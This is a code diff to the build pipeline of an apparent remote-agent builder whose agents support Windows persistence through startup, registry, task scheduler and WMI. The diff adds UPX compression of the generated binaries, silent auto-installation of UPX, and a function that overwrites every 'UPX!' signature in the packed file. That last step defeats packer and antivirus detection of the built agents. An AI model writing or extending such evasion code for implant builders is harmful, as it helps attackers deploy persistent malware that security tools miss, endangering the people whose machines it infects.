@@ -76,7 +76,133 @@ type BuildProcessConfig = {
   assemblyVersion?: string;
   assemblyCopyright?: string;
   iconBase64?: string;
+  enableUpx?: boolean;
+  upxStripHeaders?: boolean;
 };
+
+async function ensureUpxAvailable(sendToStream: (data: any) => void): Promise<string | null> {
+  try {
+    const check = await $`upx --version`.quiet().nothrow();
+    if (check.exitCode === 0) {
+      const ver = check.stdout.toString().split("\n")[0]?.trim() || "upx";
+      sendToStream({ type: "output", text: `UPX found: ${ver}\n`, level: "info" });
+      return "upx";
+    }
+  } catch {}
+
+  sendToStream({ type: "output", text: "UPX not found, attempting auto-install...\n", level: "info" });
+
+  const isWindows = process.platform === "win32";
+
+  if (!isWindows) {
+    try {
+      const apt = await $`apt-get install -y upx-ucl 2>&1`.nothrow().quiet();
+      if (apt.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via apt-get\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+    try {
+      const apt2 = await $`apt-get install -y upx 2>&1`.nothrow().quiet();
+      if (apt2.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via apt-get\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+    try {
+      const yum = await $`yum install -y upx 2>&1`.nothrow().quiet();
+      if (yum.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via yum\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+  }
+
+  if (isWindows) {
+    try {
+      const winget = await $`winget install --id upx.upx -e --accept-source-agreements --accept-package-agreements 2>&1`.nothrow().quiet();
+      if (winget.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via winget\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+    try {
+      const choco = await $`choco install upx -y 2>&1`.nothrow().quiet();
+      if (choco.exitCode === 0) {
+        sendToStream({ type: "output", text: "UPX installed via chocolatey\n", level: "info" });
+        return "upx";
+      }
+    } catch {}
+  }
+
+  const arch = process.arch === "x64" ? "amd64" : process.arch === "arm64" ? "arm64" : "amd64";
+  const plat = isWindows ? "win64" : "amd64_linux";
+  const upxVersion = "4.2.4";
+  const archiveName = `upx-${upxVersion}-${plat}`;
+  const ext = isWindows ? "zip" : "tar.xz";
+  const url = `https://github.com/upx/upx/releases/download/v${upxVersion}/${archiveName}.${ext}`;
+  const tmpDir = path.join(ensureDataDir(), "upx-install");
+  fs.mkdirSync(tmpDir, { recursive: true });
+  const archivePath = path.join(tmpDir, `upx.${ext}`);
+
+  try {
+    sendToStream({ type: "output", text: `Downloading UPX from ${url}...\n`, level: "info" });
+    const dlResult = await $`curl -fsSL -o ${archivePath} ${url}`.nothrow().quiet();
+    if (dlResult.exitCode !== 0) {
+      sendToStream({ type: "output", text: "WARNING: Failed to download UPX. Skipping compression.\n", level: "warn" });
+      return null;
+    }
+
+    if (isWindows) {
+      await $`tar -xf ${archivePath} -C ${tmpDir}`.nothrow().quiet();
+    } else {
+      await $`tar -xJf ${archivePath} -C ${tmpDir}`.nothrow().quiet();
+    }
+
+    const upxBinName = isWindows ? "upx.exe" : "upx";
+    const extractedDir = path.join(tmpDir, archiveName);
+    const upxBin = path.join(extractedDir, upxBinName);
+
+    if (fs.existsSync(upxBin)) {
+      if (!isWindows) {
+        await $`chmod +x ${upxBin}`.nothrow().quiet();
+      }
+      sendToStream({ type: "output", text: `UPX downloaded to ${upxBin}\n`, level: "info" });
+      return upxBin;
+    }
+
+    sendToStream({ type: "output", text: "WARNING: UPX binary not found after extraction. Skipping compression.\n", level: "warn" });
+    return null;
+  } catch (err: any) {
+    sendToStream({ type: "output", text: `WARNING: UPX auto-install failed: ${err.message || err}. Skipping compression.\n`, level: "warn" });
+    return null;
+  }
+}
+
+function stripUpxHeaders(filePath: string): boolean {
+  try {
+    const buf = Buffer.from(fs.readFileSync(filePath));
+    const UPX_MAGIC = Buffer.from("UPX!");
+    let modified = false;
+    let offset = 0;
+    while (offset < buf.length - 3) {
+      const idx = buf.indexOf(UPX_MAGIC, offset);
+      if (idx === -1) break;
+      buf[idx] = 0x00;
+      buf[idx + 1] = 0x00;
+      buf[idx + 2] = 0x00;
+      buf[idx + 3] = 0x00;
+      modified = true;
+      offset = idx + 4;
+    }
+    if (modified) {
+      fs.writeFileSync(filePath, buf);
+    }
+    return modified;
+  } catch {
+    return false;
+  }
+}
 
 const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
 
@@ -242,6 +368,14 @@ export async function startBuildProcess(
 
     if (config.outputName) {
       sendToStream({ type: "output", text: `Custom output name: ${config.outputName}\n`, level: "info" });
+    }
+
+    let upxBin: string | null = null;
+    if (config.enableUpx) {
+      upxBin = await ensureUpxAvailable(sendToStream);
+      if (!upxBin) {
+        sendToStream({ type: "output", text: "WARNING: UPX could not be installed. Compression will be skipped.\n", level: "warn" });
+      }
     }
 
     const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64);
@@ -530,15 +664,42 @@ export async function startBuildProcess(
         }
 
         const filePath = `${outDir}/${outputName}`;
-        const file = Bun.file(filePath);
-        const size = file.size;
+        let finalSize = Bun.file(filePath).size;
+
+        if (upxBin) {
+          sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
+          const originalSize = finalSize;
+          try {
+            const upxResult = await $`${upxBin} --best ${filePath}`.nothrow().quiet();
+            if (upxResult.exitCode !== 0) {
+              const stderr = upxResult.stderr.toString().trim();
+              sendToStream({ type: "output", text: `WARNING: UPX compression failed (exit ${upxResult.exitCode}): ${stderr}\n`, level: "warn" });
+            } else {
+              finalSize = Bun.file(filePath).size;
+              const ratio = ((1 - finalSize / originalSize) * 100).toFixed(1);
+              sendToStream({ type: "output", text: `UPX compressed: ${originalSize} → ${finalSize} bytes (${ratio}% reduction)\n`, level: "info" });
+
+              if (config.upxStripHeaders) {
+                const stripped = stripUpxHeaders(filePath);
+                if (stripped) {
+                  finalSize = Bun.file(filePath).size;
+                  sendToStream({ type: "output", text: `UPX headers stripped (signature removed)\n`, level: "info" });
+                } else {
+                  sendToStream({ type: "output", text: `WARNING: No UPX signatures found to strip\n`, level: "warn" });
+                }
+              }
+            }
+          } catch (upxErr: any) {
+            sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
+          }
+        }
 
         (build.files as any[]).push({
           name: outputName,
           filename: outputName,
           platform,
           version: agentVersion,
-          size,
+          size: finalSize,
         });
       } catch (err: any) {
         const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
